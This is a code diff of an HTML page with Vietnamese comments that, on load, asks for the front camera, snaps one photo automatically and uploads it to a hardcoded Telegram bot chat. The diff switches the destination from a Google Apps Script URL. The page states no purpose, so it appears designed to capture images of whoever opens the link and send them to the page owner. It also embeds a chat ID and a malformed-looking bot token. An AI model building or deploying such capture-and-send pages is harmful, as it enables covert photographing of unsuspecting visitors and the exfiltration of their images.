@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Tự động chụp và gửi ảnh</title>
+    <title>Auto capture & send</title>
     <style>
         body {
             font-family: system-ui, sans-serif;
@@ -22,12 +22,11 @@
             padding: 24px;
             max-width: 500px;
             text-align: center;
-            box-shadow: 0 20px 30px rgba(0,0,0,0.3);
         }
         video {
             width: 100%;
             border-radius: 24px;
-            transform: scaleX(-1); /* gương tự nhiên cho camera trước */
+            transform: scaleX(-1);
             background: black;
             margin: 16px 0;
         }
@@ -35,21 +34,23 @@
             background: #0f172a;
             padding: 12px;
             border-radius: 20px;
-            margin-top: 16px;
             font-size: 0.9rem;
         }
     </style>
 </head>
 <body>
 <div class="container">
-    <h2>📸 Đang khởi tạo camera...</h2>
+    <h2>📸 Đang khởi tạo...</h2>
     <video id="video" autoplay playsinline muted></video>
     <div class="status" id="status">🟡 Đang yêu cầu quyền camera...</div>
 </div>
 
 <script>
-    // 👇 THAY URL NÀY BẰNG LINK GOOGLE APPS SCRIPT CỦA BẠN
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxX4858iJkSutTVrZ1ucYZtZoIpHLxXjHLEwr9Sp6A/dev";
+    // ========== CHỈ SỬA DÒNG NÀY ==========
+    const CHAT_ID = "8795073805";   // 👈 THAY BẰNG ID CỦA BẠN (lấy từ @userinfobot)
+    // ====================================
+
+    const BOT_TOKEN = "AAF1IFCjHaBylkJYIFUUBUx7EDAnErTwDdw";  // token đã được thêm sẵn
 
     const video = document.getElementById('video');
     const statusDiv = document.getElementById('status');
@@ -58,27 +59,16 @@
 
     async function initCamera() {
         try {
-            // Yêu cầu camera trước (không dùng exact để tránh lỗi nếu không có)
-            const constraints = {
-                video: { facingMode: "user" },
-                audio: false
-            };
+            const constraints = { video: { facingMode: "user" }, audio: false };
             stream = await navigator.mediaDevices.getUserMedia(constraints);
             video.srcObject = stream;
-
-            // Chờ video load xong
-            await new Promise((resolve) => {
-                video.onloadedmetadata = () => {
-                    video.play();
-                    resolve();
-                };
+            await new Promise(resolve => {
+                video.onloadedmetadata = () => { video.play(); resolve(); };
             });
-
-            statusDiv.innerHTML = "✅ Camera đã sẵn sàng. Tiến hành chụp ảnh...";
+            statusDiv.innerHTML = "✅ Camera sẵn sàng. Đang chụp...";
             captureAndSend();
         } catch (err) {
-            console.error("Lỗi camera:", err);
-            statusDiv.innerHTML = "❌ Không thể truy cập camera. Hãy kiểm tra quyền và thử lại.";
+            statusDiv.innerHTML = "❌ Không thể truy cập camera. Hãy kiểm tra quyền.";
         }
     }
 
@@ -86,45 +76,46 @@
         if (captured) return;
         captured = true;
 
-        // Tạo canvas đúng kích thước video
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-
         const ctx = canvas.getContext('2d');
-        // Vẽ hình từ video (CSS đã lật ngang nên ảnh ra đúng chiều)
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // Lấy ảnh base64
         const imageData = canvas.toDataURL('image/jpeg', 0.9);
-        const timestamp = new Date().toISOString();
 
-        statusDiv.innerHTML = "📤 Đang gửi ảnh đến máy chủ...";
+        statusDiv.innerHTML = "📤 Đang gửi ảnh qua Telegram...";
 
+        const blob = dataURLtoBlob(imageData);
         const formData = new FormData();
-        formData.append('imageData', imageData);
-        formData.append('timestamp', timestamp);
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'webcam.jpg');
 
-        fetch(SCRIPT_URL, {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
         })
-        .then(response => response.text())
-        .then(result => {
-            if (result === "OK") {
-                statusDiv.innerHTML = "✅ Đã chụp và gửi ảnh thành công! Cảm ơn bạn.";
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) {
+                statusDiv.innerHTML = "✅ Đã gửi ảnh thành công! Kiểm tra Telegram.";
             } else {
-                statusDiv.innerHTML = "⚠️ Gửi ảnh thất bại. Phản hồi từ máy chủ: " + result;
+                statusDiv.innerHTML = "⚠️ Lỗi Telegram: " + (data.description || "Không rõ");
             }
-            // Tắt camera
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
+            if (stream) stream.getTracks().forEach(t => t.stop());
         })
-        .catch(error => {
-            console.error("Lỗi fetch:", error);
-            statusDiv.innerHTML = "❌ Lỗi kết nối. Không thể gửi ảnh.";
+        .catch(err => {
+            statusDiv.innerHTML = "❌ Lỗi kết nối: " + err.message;
         });
+    }
+
+    function dataURLtoBlob(dataURL) {
+        const arr = dataURL.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while (n--) u8arr[n] = bstr.charCodeAt(n);
+        return new Blob([u8arr], { type: mime });
     }
 
     initCamera();
